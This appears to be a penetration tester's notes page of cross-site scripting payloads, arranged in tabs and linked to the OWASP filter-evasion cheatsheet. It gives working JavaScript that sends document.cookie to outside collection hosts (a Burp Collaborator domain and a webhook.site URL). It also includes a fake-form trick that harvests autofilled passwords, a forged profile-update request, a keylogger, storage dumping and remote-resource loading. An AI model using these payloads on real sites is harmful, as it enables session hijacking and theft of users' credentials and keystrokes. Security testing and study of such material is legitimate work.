---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Payloads

{% hint style="info" %}
[XSS Filter Evasion Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html) (OWASP)
{% endhint %}

{% tabs %}
{% tab title="Stealing Cookies" %}
{% code overflow="wrap" %}
```javascript
<img src="http://localhost?c='+document.cookie+'" />
fetch("http://localhost?c="+document.cookie);

// collaborator payload
<script>
    fetch('https://705jjd45qk9l1pb4rhns097xgomfa5yu.oastify.com', 
    {
        method: 'POST',
        mode: 'no-cors',
        body:document.cookie
    });
</script>

// webhook payload
<script>var i = new Image; i.src="https://webhook.site/094ef770-e736-4b31-a3cb-34be690ff1b9/?"+document.cookie</script>
```
{% endcode %}
{% endtab %}

{% tab title="Autofilled Creds" %}
{% code overflow="wrap" %}
```javascript
// create the input elements
let usernameField = document.createElement("input")
usernameField.type = "text"
usernameField.name = "username"
usernameField.id = "username"

let passwordField = document.createElement("input")
passwordField.type = "password"
passwordField.name = "password"
passwordField.id = "password"

// append the elements to the body of the page
document.body.appendChild(usernameField)
document.body.appendChild(passwordField)

// exfiltrate as needed (we need to wait for the fields to be filled before exfiltrating the information)
setTimeout(function() {
 console.log("Username:", document.getElementById("username").value)
 console.log("Password:", document.getElementById("password").value)
}, 1000);
```
{% endcode %}
{% endtab %}

{% tab title="Session Riding" %}
```javascript
let xhr = new XMLHttpRequest();
xhr.open('POST','http://localhost/updateprofile',true);
xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
xhr.send('email=updated@email.com’);
```
{% endtab %}

{% tab title="Keylogging" %}
```javascript
document.onkeypress = function(e) {
 get = window.event ? event : e
 key = get.keyCode ? get.keyCode : get.charCode
 key = String.fromCharCode(key)
 console.log(key)
}
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Local Storage" %}
```javascript
let localStorageData = JSON.stringify(localStorage)
let sessionStorageData = JSON.stringify(sessionStorage)
```
{% endtab %}

{% tab title="Remote Resouces" %}
```javascript
fetch('http://localhost/endpoint’)
<img src='http://localhost/file' />
<img src='x' onerror='http://localhost/file' />
<img src="x" onerror="window.location.href='https://localhost/file'">
<script src='http://localhost/file'></script>
```
{% endtab %}
{% endtabs %}
